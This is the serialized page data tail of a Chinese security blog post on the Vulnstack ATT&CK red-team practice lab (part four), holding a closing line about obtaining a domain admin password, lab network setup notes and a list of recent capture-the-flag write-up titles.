src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image58.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e拿到域管理员密码\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"Vulnstack - ATT\u0026CK红队评估实战靶场(四)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机","description":"ATT\u0026CK红队评估实战靶场(四)\n\n 靶机链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/6/\n \n\n环境搭建\n\n新建两张仅主机网卡，一张`192.168.183.0`网段（内网网卡），一张1`92.168.157.0`网段（模拟外网网段），然后按照拓补图分配网卡即可\n\n/image50.png)\n\nIP信息：\n\nKali `192.158.1..."},"recentPosts":[{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"},{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"04","id":"Vulnstack红队评估实战靶场(四)"},"buildId":"NVqbYh_W7zwCLmslkTGaC","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>